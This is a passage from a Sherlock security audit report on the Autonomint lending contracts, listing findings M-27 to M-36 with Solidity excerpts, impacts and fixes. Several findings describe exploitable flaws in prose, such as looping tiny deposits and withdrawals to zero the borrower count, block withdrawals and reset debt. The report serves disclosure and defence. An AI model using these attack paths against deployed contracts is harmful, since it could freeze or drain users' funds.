The problem is that there is no way to for the protocol to retrieve these funds neither is it distributed to users elsewhere

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Yield form LRTs is stuck in the treasury without a way to withdraw them

### PoC

_No response_

### Mitigation

Consider inplementing a mechanism to withdraw or distribute this yield

# Issue M-27: DOS on liquidation type 1 due to underflow in cds profits computation 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/840 

## Found by 
0x37, 0x73696d616f, Cybrid, John44, LordAlive, Ocean\_Sky, ParthMandale, Silvermist, futureHack, nuthan2x, t.aksoy

### Summary

An underflow in [cds profits computation](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L211-L212) can cause liquidation type 1 to revert.

### Root Cause

Here is the formula for cds profits computation. It is possible that **returnToTreasury** (aka as borrowerDebt) can be greater than **deposited amount value** (((depositDetail.depositedAmountInETH * depositDetail.ethPriceAtDeposit) / BorrowLib.USDA_PRECISION) / 100)  which can cause the formula to revert and DOS the liquidation type 1 process.

```Solidity
File: borrowLiquidation.sol
211:         // Calculate the CDS profits, USDA precision is 1e12, @audit need to double check if profit formula is right logic or can underflow
212:         uint128 cdsProfits = (((depositDetail.depositedAmountInETH * depositDetail.ethPriceAtDeposit) / BorrowLib.USDA_PRECISION) / 100) - returnToTreasury - returnToAbond;
```

Here is the details of returntoTreasury which is equivalent to borrower's debt amount during time of liquidation. This includes interest accumulated from loan creation up to liquidation time. If lastCumulativeRate reach a certain percentage like 126% in my example issue, borrowerDebt will become greater than **deposited amount value**  ((depositDetail.depositedAmountInETH * depositDetail.ethPriceAtDeposit) / BorrowLib.USDA_PRECISION) / 100) which can cause underflow error.

```Solidity
File: borrowLiquidation.sol
204:         // Calculate borrower's debt, rate precision is 1e27, this includes interest accumulated from creation of loan to liquidation
205:         uint256 borrowerDebt = ((depositDetail.normalizedAmount * lastCumulativeRate) / BorrowLib.RATE_PRECISION);
206:         uint128 returnToTreasury = uint128(borrowerDebt);
```

Here is the details of returnToAbond which represents 10% of deposited amount after subtracting returntotreasury.
```Solidity
File: borrowLiquidation.sol
209:         uint128 returnToAbond = BorrowLib.calculateReturnToAbond(depositDetail.depositedAmountInETH, depositDetail.ethPriceAtDeposit, returnToTreasury);
```
```Solidity
File: BorrowLib.sol
137:     function calculateReturnToAbond(
138:         uint128 depositedAmount,
139:         uint128 depositEthPrice,
140:         uint128 returnToTreasury
141:     ) public pure returns (uint128) {
142:         // 10% of the remaining amount, USDA precision is 1e12
143:         return (((((depositedAmount * depositEthPrice) / USDA_PRECISION) / 100) - returnToTreasury) * 10) / 100;
144:     }
```
Regarding the lastcumulativerate on how it exactly increases, it can be computed by the following below. In line 245, there is [_rpow](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L1038-L1056) computation in which time interval, interest rate per second are factors in increasing the last cumulative rate. The more time the loan is not liquidated or not paid, the more the loan get bigger due to interest rate which will eventually reach 126%. The cumulative rate variable should start or set at around 100% based on set APR after protocol deployed the borrowing contract, so the very first loan will use the cumulative rate at this rate, then will increase from there moving forward.

```Solidity
File: BorrowLib.sol
222:     /**
223:      * @dev calculates cumulative rate
224:      * @param noOfBorrowers total number of borrowers in the protocol
225:      * @param ratePerSec interest rate per second
226:      * @param lastEventTime last event timestamp
227:      * @param lastCumulativeRate previous cumulative rate
228:      */
229:     function calculateCumulativeRate(
230:         uint128 noOfBorrowers,
231:         uint256 ratePerSec,
232:         uint128 lastEventTime,
233:         uint256 lastCumulativeRate
234:     ) public view returns (uint256) {
235:         uint256 currentCumulativeRate;
236: 
237:         // If there is no borrowers in the protocol
238:         if (noOfBorrowers == 0) {
239:             // current cumulative rate is same as ratePeSec
240:             currentCumulativeRate = ratePerSec;
241:         } else {
242:             // Find time interval between last event and now
243:             uint256 timeInterval = uint128(block.timestamp) - lastEventTime;
244:             //calculate cumulative rate
245:             currentCumulativeRate = lastCumulativeRate * _rpow(ratePerSec, timeInterval, RATE_PRECISION);
246:             currentCumulativeRate = currentCumulativeRate / RATE_PRECISION;
247:         }
248:         return currentCumulativeRate;
249:     }
```


Let's further discuss the exact situation on the attack path to describe the issue on more details.


### Internal pre-conditions

If the cumulative rate exceed certain percentage like 125% in my sample issue, it will cause revert to the cds profits computation.

### External pre-conditions

_No response_

### Attack Path

Let's consider this scenario wherein the 

**Borrower deposit details at time of loan creation:**
Deposited amount in eth  = 50 eth
Ether price at deposit time = 3000 usd price of 1 Eth per oracle during deposit

**During time of liquidation**
lastCumulativerate is 126% or 1.26e27

1. Let's compute first the returnToTreasury or borrower's debt during time of liquidation. In this case, we use 126% to represent the borrower's debt value in percentage. It increased to that figure due to interest accumulated since loan creation up to liquidation. The amount of returnToTreasury here is 1.512e11 or 151,200 usd
<img width="915" alt="image" src="https://sherlock-files.ams3.digitaloceanspaces.com/gh-images/9b515d43-ea6b-41b0-9a86-d5bdf01005db" />



2. Let's compute the returnToabond as part also of formula, in this case, we already encountered a problem of underflow error due to subtraction of larger returnToTreasury. See below 
<img width="841" alt="image" src="https://sherlock-files.ams3.digitaloceanspaces.com/gh-images/9a02f62c-0dc5-481b-a34b-182f8a5e33ec" />

3. As you can see in this CDS profit computation below, there is already underflow error when the bigger returnToTreasury is subtracted to deposited amount value.
<img width="1153" alt="image" src="https://sherlock-files.ams3.digitaloceanspaces.com/gh-images/c1c8fafd-a1d8-4fc8-bb64-5da4de8a27f5" />


Here is the link of google sheet for [computation copy](https://docs.google.com/spreadsheets/d/1Cmek971NLPn-PoYOFyPdtvBWqUEE11kHzgdkAg_vXts/edit?usp=drive_link)


### Impact

Interruption of liquidation type 1 process. The loan is not liquidatable.

### PoC

See attack path

### Mitigation

Revise the computation of cds profits, it should not revert in any way possible so the liquidation won't be interrupted.

# Issue M-28: excess funds will not always be refunded to borrower when they are withdrawing 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/890 

## Found by 
0x23r0, 0x37, 0xAristos, Audinarey, DenTonylifer, John44, itcruiser00, maxim371, newspacexyz, santiellena, t.aksoy, theweb3mechanic, valuevalk, volodya

### Summary

_No response_

### Root Cause

When a borrower calls `_withdraw()` the funds sent with the call to cover any crosschain transactions is only [returned](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L686-L693) when there the position does not need to be protected on the downside

```solidity
File: borrowing.sol
687:         {if (result.downsideProtected > 0) {
688:             _getDownsideFromCDS(result.downsideProtected, msg.value - fee.nativeFee);
689:         } else {
690:             // Send the remaining ETH to Borrower
691:      @>     (bool sent, ) = payable(toAddress).call{value: msg.value - fee.nativeFee}("");
692:             if (!sent) revert Borrow_TransferFailed();
693:         }

```

The developer wrongly assumes that provided the `result.downsideProtected > 0` then there must be a cross chain call to request funds to cover the downside.

This is not true considering the [implementaion of the `_getDownsideFromCDS()`](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L725-L738) function as shown below

```solidity
File: borrowing.sol
721:     function _getDownsideFromCDS(
722:         uint128 downsideProtected,
723:         uint256 feeForOFT
724:     ) internal {
725:         if (cds.getTotalCdsDepositedAmount() < downsideProtected) {
726:             // Call the oftOrCollateralReceiveFromOtherChains function in global variables
727:             globalVariables.oftOrCollateralReceiveFromOtherChains{value: feeForOFT}(
728:                 IGlobalVariables.FunctionToDo(3),
729:                 IGlobalVariables.USDaOftTransferData(address(treasury),downsideProtected - cds.getTotalCdsDepositedAmount()),
730:                 // Since we don't need ETH, we have passed zero params
731:                 IGlobalVariables.CollateralTokenTransferData(address(0),0,0,0), 
732:                 IGlobalVariables.CallingFunction.BORROW_WITHDRAW,
733:                 msg.sender
734:             );
735:         } else {
736:             // updating downside protected from this chain in CDS
737:             cds.updateDownsideProtected(downsideProtected);
738:         }
739:         // Burn the borrow amount
740:         treasury.approveTokens(IBorrowing.AssetName.USDa, address(this), downsideProtected);
741:         bool success = usda.contractBurnFrom(address(treasury), downsideProtected);
742:         if (!success) revert Borrow_BurnFailed();
743:     }

```

Notice that the cross-chain request is invoke only when the current `TotalCdsDepositedAmount` is not enough to cover the accrued `downsideProtected`.

Hence in a situation where the funds in the current chain are enough to cover the downside, the funds sent for fees are not refunded

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Funds sent to cover fees are not refunded even when they are not used leadng to loss of funds and there is not way to sweep them out of the `borrowing contract.

### PoC

_No response_

### Mitigation

Consider reimplementing the logic for the fee reversal during withdrawal

# Issue M-29: Protected downside is not updated when `cds.getTotalCdsDepositedAmount() < downsideProtected` 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/911 

## Found by 
0x73696d616f, Audinarey, nuthan2x, tjonair, volodya

### Summary

The [`borrowing::_withdraw`](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L635) is used to withdraw collateral from the protocol and burn USDa.
Here, [`borrowing::_getDownsideFromCDS`](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L721C14-L721C33) is called to update the downside protected if `cds.getTotalCdsDepositedAmount() >= downsideProtected` otherwise fetch the shortage from other chain via layerzero call.
```solidity
    function _getDownsideFromCDS(
        uint128 downsideProtected,
        uint256 feeForOFT
    ) internal {
        if (cds.getTotalCdsDepositedAmount() < downsideProtected) {
            // Call the oftOrCollateralReceiveFromOtherChains function in global variables
            globalVariables.oftOrCollateralReceiveFromOtherChains{value: feeForOFT}(
                IGlobalVariables.FunctionToDo(3),
                IGlobalVariables.USDaOftTransferData(address(treasury),downsideProtected - cds.getTotalCdsDepositedAmount()),
                // Since we don't need ETH, we have passed zero params
                IGlobalVariables.CollateralTokenTransferData(address(0),0,0,0),
                IGlobalVariables.CallingFunction.BORROW_WITHDRAW,
                msg.sender
            );
        } else {
            // updating downside protected from this chain in CDS
            cds.updateDownsideProtected(downsideProtected);
        }
        // Burn the borrow amount
        treasury.approveTokens(IBorrowing.AssetName.USDa, address(this), downsideProtected);
        bool success = usda.contractBurnFrom(address(treasury), downsideProtected);
        if (!success) revert Borrow_BurnFailed();
    }
```
As we can see `cds.updateDownsideProtected(downsideProtected)` is called to update the entire `downsideProtected` at`CDS::downsideProtected` variable.
However, in case of `cds.getTotalCdsDepositedAmount() < downsideProtected`, we get the lacking `USDa` from other chain via layerzero call, here we fail to update the `CDS::downsideProtected`.
Hence, the `downsideProtected` will be short, which will eventually reduce less downside protected when `_updateCurrentTotalCdsDepositedAmount` is called in [`CDS::deposit`]()
```solidity
    function _updateCurrentTotalCdsDepositedAmount() private {
        if (downsideProtected > 0) {
            totalCdsDepositedAmount -= downsideProtected;                                          <@
            totalCdsDepositedAmountWithOptionFees -= downsideProtected;                 <@
            downsideProtected = 0;
        }
    }
```
This `totalCdsDepositedAmount` is used for calculating `calculateCumulativeValue` inside the `CDSLib::deposit` function, that will inflate the omnichain cumulative value, this will lead to CDS withdrawers will get a higher `optionFees`
```solidity
function withdraw(
        uint64 index,
        uint256 excessProfitCumulativeValue,
        uint256 nonce,
        bytes memory signature
    ) external payable nonReentrant whenNotPaused(IMultiSign.Functions(5)) {
       // rest of the code
        IGlobalVariables.OmniChainData memory omniChainData = globalVariables.getOmniChainData();

        // Calculate current value
        CalculateValueResult memory result = _calculateCumulativeValue(
            omniChainData.totalVolumeOfBorrowersAmountinWei,
            omniChainData.totalCdsDepositedAmount,
            ethPrice
        );

        // Set the cumulative vaue
        (omniChainData.cumulativeValue, omniChainData.cumulativeValueSign) = getCumulativeValue(
            omniChainData,
            result.currentValue,
            result.gains
        );

        // updating totalCdsDepositedAmount by considering downsideProtected
        _updateCurrentTotalCdsDepositedAmount();

        // updating global data
        if (omniChainData.downsideProtected > 0) {
            omniChainData.totalCdsDepositedAmount -= omniChainData.downsideProtected;
            omniChainData.totalCdsDepositedAmountWithOptionFees -= omniChainData.downsideProtected;
            omniChainData.downsideProtected = 0;
        }

        // Calculate return amount includes eth Price difference gain or loss option fees
        uint256 optionFees = ((cdsDepositDetails.normalizedAmount * omniChainData.lastCumulativeRate) /  <@
            (CDSLib.PRECISION * CDSLib.NORM_PRECISION)) - cdsDepositDetails.depositedAmount;

        // Calculate the options fees to get from other chains
        uint256 optionsFeesToGetFromOtherChain = getOptionsFeesProportions(optionFees);

        // Update user deposit data
        cdsDepositDetails.withdrawedTime = uint64(block.timestamp);
        cdsDepositDetails.ethPriceAtWithdraw = ethPrice;
        uint256 currentValue = cdsAmountToReturn(
            msg.sender,
            index,
            omniChainData.cumulativeValue,
            omniChainData.cumulativeValueSign,
            excessProfitCumulativeValue
        ) - 1; //? subtracted extra 1 wei

        cdsDepositDetails.depositedAmount = currentValue;
        uint256 returnAmount = cdsDepositDetails.depositedAmount + optionFees;    <@
        cdsDepositDetails.withdrawedAmount = returnAmount;
       // rest of the code
    }
```


### Root Cause

In [`borrowing.sol:726`](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L726), there is a missing `updateDownsideProtected` call. Allowing to inflate the cumulative value.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

1. A condition arrives for a user where the downside protection of the user is greater than total CDS deposited Amount.
2. The user calls `CDS::withdraw`, where the downside protection shortfall is fulfilled via layer zero call.
3. However, due to no downside protection update, the cumulative value will get artificially inflated, allowing CDS withdrawers gain higher option fees than intended

### PoC

_No response_

### Mitigation

It is recommended to update downside protection for the amount not borrowed from other chain
```diff
    function _getDownsideFromCDS(
        uint128 downsideProtected,
        uint256 feeForOFT
    ) internal {
        if (cds.getTotalCdsDepositedAmount() < downsideProtected) {
            // Call the oftOrCollateralReceiveFromOtherChains function in global variables
+         cds.updateDownsideProtected(downsideProtected); 
            globalVariables.oftOrCollateralReceiveFromOtherChains{value: feeForOFT}(
                IGlobalVariables.FunctionToDo(3),
                IGlobalVariables.USDaOftTransferData(address(treasury),downsideProtected - cds.getTotalCdsDepositedAmount()),
                // Since we don't need ETH, we have passed zero params
                IGlobalVariables.CollateralTokenTransferData(address(0),0,0,0),
                IGlobalVariables.CallingFunction.BORROW_WITHDRAW,
                msg.sender
            );
        } else {
            // updating downside protected from this chain in CDS
            cds.updateDownsideProtected(downsideProtected);
        }
        // Burn the borrow amount
        treasury.approveTokens(IBorrowing.AssetName.USDa, address(this), downsideProtected);
        bool success = usda.contractBurnFrom(address(treasury), downsideProtected);
        if (!success) revert Borrow_BurnFailed();
    }
```

# Issue M-30: `Treasury.noOfBorrowers` can be set to 0 by looping wei deposit<->withdrawals and DoS withdrawals and reset borrower debt 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/929 

## Found by 
0x23r0, 0x73696d616f, 0xbakeng, newspacexyz, pashap9990, santiellena, t.aksoy, volodya

### Summary

`Treasury.noOfBorrowers` is [increased](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L169) when a user deposits for the first time, as the index is 0. Then, it is [decreased](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L269-L271) when `borrowing[borrower].depositedAmountInETH` becomes 0, which happens when the last deposit of the user is withdrawn.
The issue with this approach is that when the same user redeposits, `noOfBorrowers` will not be increased, as `borrowing[user].hasDeposited` is true, but when this same user withdraws, it is decreased. Thus, it's possible to reduce `Treasury.noOfBorrowers` to 0, regardless of the actual number of deposits.

### Root Cause

In the `Treasury`, the number of borrowers is increased and decreased in different ways, leading to incorrect behaviour as explained above.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Protocol is working correctly with some cds deposits and borrow deposits.
2. Malicious user loops deposits and withdrawals of very small amounts to reduce `treasury.noOfBorrowers` to 0.
3. Two things will happen: 1) users can not withdraw their borrow deposits, as `treasury.noOfBorrowers` underflows when they try and 2) the debt will be [reset](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L240) to 0 even though there are deposits that have accrued debt.

### Impact

DoSed withdrawals and debt reset for all borrowers, taking the protocol the loss and users are DoSed.

### PoC

None.

### Mitigation

Increase and decrease the number of borrowers symmetrically.

# Issue M-31: Submiting an offchain delayed offer will revert due to incorrect decimal calculations 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/942 

## Found by 
0x37, Audinarey, Aymen0909, John44, LordAlive, ParthMandale, PeterSR, futureHack, nuthan2x, valuevalk

### Summary

liquidationType2 takes 50% of a liquidated user's collateral and transfers it to Synthethix. To do that it first must convert the collateral into WETH and after that the WETH to sETH. After that the sETH is converted into sUSD and used to submit an offchain delayed order in Synthetix for short position with 1X leverage. The issue is that the `sizeDelta` parameter of the call to `submitOffchainDelayedOrder` is scaled incorrectly, causing the call to revert.

### Root Cause

In `liquidationType2` when a call is made to `submitOffchainDelayedOrder` the following value is passed for the `sizeDelta`/first parameter:

https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L362-L365
```solidity
        synthetixPerpsV2.submitOffchainDelayedOrder(
            -int((uint(margin * 1 ether * 1e16) / currentEthPrice)),
            currentEthPrice * 1e16
        );
```

As we an see the first parameter will have the following decimal precision:
-margin: 18 decimals
-1 ether: 18 decimals
-1e16: 16 decimals
-currentEthPrice: 2 decimals

Therefore, 18 + 18 + 16 - 2 = 50 decimal places. This is problematic as the decimals are too high and will cause the call to Synthetix to revert. The `sizeDelta` must instead be: 'sizeDelta: A wei value of the size in units of the asset being traded' per the Synthetix documentations, therefore, it should have 18 decimal places instead.

https://docs.synthetix.io/v3/for-perp-integrators/perps-v3#:~:text=sizeDelta,asset%20being%20traded

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. User gets liquidated through `liquidationType2`.
2. The call fails because the amount passed as the `sizeDelta` of `submitOffchainDelayedOrder` is significantly higher than it should be.

### Impact

Users will fail to be liquidated through `liquidationType2`.

### PoC

_No response_

### Mitigation

Make sure to use the appropriate decimal scaling when calling `submitOffchainDelayedOrder`.

# Issue M-32: `CDSLib::calculateCumulativeRate()` incorrectly only increment the local option fees when there are cds deposits 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/946 

## Found by 
0x73696d616f

### Summary

`CDSLib::calculateCumulativeRate()` adds option fees to `_totalCdsDepositedAmountWithOptionFees` if `_totalCdsDepositedAmount` is [not null](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L174-L176), skipping if it is null.

The problem is that the 20% ratio of cds pool depositors to borrowers is calculated on the global cds depositors, not the local, so a chain can have 0 cds depositors but still have borrowers depositing and adding option fees. However, these option fees will not be tracked locally and will not be redeemable, underflowing when the other chain tries to fetch the option fees from the local chain.

### Root Cause

In `CDSLib.sol:174`, `_totalCdsDepositedAmountWithOptionFees` is skipped summing option fees if total cds depositors in the chain is null.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Cds depositors deposit USDa on chain B.
2. Borrower borrows on chain A, which is possible because the ratio is calculated on the [global](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L666-L667) variables. Option fees are not added to `_totalCdsDepositedAmountWithOptionFees`, which remains 0.
3. chain B [fetches](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L90) option fees from chain A when cds depositors on chain B withdraw.
4. option fees are never sent back from chain A to chain B as it underflows in [cds.updateTotalCdsDepositedAmountWithOptionFees()](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/GlobalVariables.sol#L630). As such, these option fees will be stuck. Even if users deposit more in chain A, these option fees will always be stuck.

### Impact

Stuck option fees.

### PoC

None.

### Mitigation

Always add the option fees.

# Issue M-33: Inconsistent Use of `lastCumulativeRate` in `depositTokens()` and `withdraw()` Functions in `Borrowings` Contract 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/961 

## Found by 
0x37, 0x73696d616f, 0xAadi, Cybrid, EgisSecurity, John44, LZ\_security, OrangeSantra, Pablo, RampageAudit, Ruhum, almurhasan, gss1, pashap9990, super\_jack, t.aksoy

### Summary

The `depositTokens()` and `withdraw()` functions in the `Borrowing` contract exhibit inconsistent use of the `lastCumulativeRate`. This inconsistency arises because the `lastCumulativeRate` is used in calculations before it is updated, leading to potential inaccuracies in interest calculations among multiple transactions.

### Root Cause

In both `depositTokens()` and `withdraw()` functions, `lastCumulativeRate` is passed to `BorrowLib.deposit()` and `BorrowLib.withdraw()` respectively, before calling `calculateCumulativeRate()` to update it. 

```solidity
        totalNormalizedAmount = BorrowLib.deposit(
            BorrowLibDeposit_Params(
                LTV,
                APR,
@>              lastCumulativeRate,
                totalNormalizedAmount,
                exchangeRate,
                ethPrice,
                lastEthprice
            ),
            depositParam,
            Interfaces(treasury, globalVariables, usda, abond, cds, options),
            assetAddress
        );

        //Call calculateCumulativeRate() to get currentCumulativeRate
@>      calculateCumulativeRate();
        lastEventTime = uint128(block.timestamp);
```
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L241C1-L254C11

```solidity
        BorrowWithdraw_Result memory result = BorrowLib.withdraw(
            depositDetail,
            BorrowWithdraw_Params(
                toAddress,
                index,
                ethPrice,
                exchangeRate,
                withdrawTime,
                lastCumulativeRate,
                totalNormalizedAmount,
                bondRatio,
                collateralRemainingInWithdraw,
                collateralValueRemainingInWithdraw
            ),
            Interfaces(treasury, globalVariables, usda, abond, cds, options)
        );
.
.
        lastEventTime = uint128(block.timestamp);}

        // Call calculateCumulativeRate function to get the interest
@>      calculateCumulativeRate();
```
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L649C1-L664C11

And the `lastCumulativeRate` is used to calculate `normalizedAmount` and `borrowerDebt`

```solidity
        // Calculate normalizedAmount
        uint256 normalizedAmount = calculateNormAmount(tokensToMint, libParams.lastCumulativeRate);
```
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L749C1-L750C100

```solidity
            // Calculate th borrower's debt
            uint256 borrowerDebt = calculateDebtAmount(depositDetail.normalizedAmount, params.lastCumulativeRate);
```
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L824C1-L825C115

This results in using an outdated cumulative rate for the first transaction, while subsequent transactions use the updated rate, causing discrepancies.



### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Allow a significant time gap since the last transaction to accumulate interest.
2. Execute two simultaneous transactions (e.g., deposits or withdrawals).
3. Observe that the first transaction uses an outdated `lastCumulativeRate`, while the second uses the updated rate.

### Impact

The first transaction uses an outdated cumulative rate, while subsequent transactions use the updated cumulative rate, leading to incorrect interest calculations. This discrepancy causes inconsistencies in the normalized deposit amount and borrower debt, potentially affecting the protocol's financial accuracy .



### PoC

_No response_

### Mitigation

Ensure that `calculateCumulativeRate()` is called at the beginning of both the `depositTokens()` and `withdraw()` functions to update `lastCumulativeRate` before it is used in any calculations. This ensures that all transactions use the most current cumulative rate.

# Issue M-34: `liquidationType2()` will always due wrong assumption that Asset:sAsset are minted 1:1 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/962 

## Found by 
Audinarey, John44, pashap9990

### Summary

_No response_

### Root Cause


The problem is that the developer wrongly [assumes ETH:sETH is minted 1:1](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L347-L354) and as such an equivalent amount of `sETH` is received when `wrapper::mint()` was called and as such when `synthetix.exchange()` is called it attempts to transfer more than the amount of `sETH` it actually has to exchange for `sUSD`

```solidity
File: borrowLiquidation.sol
324:     function liquidationType2( //@audit SUBMITTED-MED: missing  omnichainData update (sponsor confirmed)
325:         address user,
326:         uint64 index,
327:         uint64 currentEthPrice
328:     ) internal {

/////           .....................

348:    @>   wrapper.mint(amount);
349:         // Exchange sETH with sUSD
350:         synthetix.exchange( 
351:             0x7345544800000000000000000000000000000000000000000000000000000000,
352:  @>         amount,
353:             0x7355534400000000000000000000000000000000000000000000000000000000
354:         );

```

A look at the [`wrapper::mint()`](https://sepolia-optimism.etherscan.io/address/0x1ea449185ee156a508a4aea2affcb88ec400a95d#code#L1489) function in the `wrapper` contract shows that fee are removed from from the input amount during minting

```solidity
    function mint(uint amountIn) external notPaused issuanceActive {
        ///    ...................

 @>     (uint feeAmountTarget, bool negative) = calculateMintFee(actualAmountIn);
  @>    uint mintAmount = negative ? actualAmountIn.add(feeAmountTarget) : actualAmountIn.sub(feeAmountTarget);

        // Transfer token from user.
        bool success = _safeTransferFrom(address(token), msg.sender, address(this), actualAmountIn);
        require(success, "Transfer did not succeed");

        // Mint tokens to user
 @>     _mint(mintAmount);

        emit Minted(msg.sender, mintAmount, negative ? 0 : feeAmountTarget, actualAmountIn);
    }
```

The amount of sAsset actually received is less minting fees and as such calling `exchange with `amount` will revert

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

This can lead to a DOS using `liquidationType2()`

### PoC

_No response_

### Mitigation

considering caching the actual balance of sETH received from the `wrapper and use it to call `exchange()`

# Issue M-35: Incorrect Update of `calculateCumulativeRate` in `_withdraw` Results in Erroneous Interest Calculation 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/1003 

## Found by 
0x37, 0xAadi, Abhan1041, Cybrid, EgisSecurity, LordAlive, ParthMandale, RampageAudit, Silvermist, futureHack, newspacexyz, nuthan2x, onthehunt, smbv-1923, super\_jack, vatsal, volodya

### Summary

In the Borrowing::_withdraw function, the calculateCumulativeRate method is invoked after the lastEventTime variable is updated to the current block.timestamp. 
Here's the relevant portion of the function:
```solidity
function _withdraw(
        address toAddress,
        uint64 index,
        bytes memory odosAssembledData,
        uint64 ethPrice,
        uint128 exchangeRate,
        uint64 withdrawTime
    ) internal {
        ...
            lastEventTime = uint128(block.timestamp);
        }

        // Call calculateCumulativeRate function to get the interest
        calculateCumulativeRate();
        ...
    }
```
The calculateCumulativeRate function internally calls a method from BorrowLib and passes the lastEventTime—which was updated just before this call—as a parameter. 
Here's the code for calculateCumulativeRate:
```solidity
function calculateCumulativeRate() public returns (uint256) {
        uint128 noOfBorrowers = treasury.noOfBorrowers();
        uint256 currentCumulativeRate = BorrowLib.calculateCumulativeRate(
            noOfBorrowers,
            ratePerSec,
            lastEventTime,
            lastCumulativeRate
        );
        lastCumulativeRate = currentCumulativeRate;
        return currentCumulativeRate;
    }
```
In BorrowLib.calculateCumulativeRate, the currentCumulativeRate is calculated using the difference between the current block.timestamp and the lastEventTime. This difference is referred to as timeInterval.
However, since lastEventTime is updated to block.timestamp before the call to calculateCumulativeRate, the timeInterval becomes 0. This causes the interest to remain unchanged, as no meaningful time difference is accounted for in the calculations. This issue prevents the proper update of the cumulative rate and leaves it at its previous value.



### Root Cause

https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L701C4-L704C35

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

The interest calculation relies on the `timeInterval`, which is the difference between the current time and `lastEventTime`. In the `_withdraw` function, `lastEventTime` is updated to `block.timestamp` before the interest is calculated, resulting in no actual update to the interest. 

As a result, each time the `_withdraw` function is called, the interest for the period (current time - `lastEventTime` before the function call) is not properly accounted for.

### Impact

The interest is not being updated correctly in the `_withdraw` function, causing the interest for that time interval to be missed for all users.

### PoC

_No response_

### Mitigation

The protocol should ensure that `calculateCumulativeRate` is updated before `lastEventTime` is set to `block.timestamp`, allowing the interest to be calculated accurately.

# Issue M-36: wrong amount of `sUSD` is used to open a short position in synthetix 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/1007 

## Found by 
Audinarey, John44, pashap9990, valuevalk

### Summary

per [OP `sUSD](https://optimistic.etherscan.io/token/0x8c6f28f2f1a3c87f0f938b96d27520d9751ec8d9#readContract) contract, the `sUSD` has 18 decimals

In the `liquidationType2()` the `amount` variable is the amount of ETH used in the transaction to mint sETH and then exchanged to `sUSD`


```solidity
File: borrowLiquidation.sol
349:         // Exchange sETH with sUSD
350:         synthetix.exchange( 
351:             0x7345544800000000000000000000000000000000000000000000000000000000,
352:             amount,
353:             0x7355534400000000000000000000000000000000000000000000000000000000
354:         );
355: 
356:         // Calculate the margin
357:         int256 margin = int256((amount * currentEthPrice) / 100);
358:         // Transfer the margin to synthetix
359:         synthetixPerpsV2.transferMargin(margin);
360: 
361:         // Submit an offchain delayed order in synthetix for short position with 1X leverage
362:         synthetixPerpsV2.submitOffchainDelayedOrder(
363:             -int((uint(margin * 1 ether * 1e16) / currentEthPrice)), 
364:             currentEthPrice * 1e16
365:         );

```
